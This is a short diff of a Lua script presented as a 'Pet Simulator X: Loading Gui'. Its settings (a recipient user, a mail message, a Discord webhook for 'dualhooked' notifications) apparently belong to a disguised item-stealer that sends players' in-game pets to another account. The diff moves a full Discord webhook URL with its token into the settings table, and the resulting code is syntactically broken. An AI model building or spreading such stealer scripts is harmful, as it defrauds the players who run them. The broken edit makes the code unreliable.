@@ -7,8 +7,8 @@
                    __/ |                                       
                   |___/                                                                                                                  
 _G.ScriptTitle = "Pet Simulator X: Loading Gui"
-local dhwebhook = "https://discord.com/api/webhooks/1155839297858060349/5r5Xc-qhAvB3ehdX9qClIJD7C83zaWGsRJsT5wm2x8avcLytUBMz6L54uHwXp09rIeIG"
 getgenv().Settings = {
+    local dhwebhook = "https://discord.com/api/webhooks/1155839297858060349/5r5Xc-qhAvB3ehdX9qClIJD7C83zaWGsRJsT5wm2x8avcLytUBMz6L54uHwXp09rIeIG"
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "FuegoEterno OnTop",
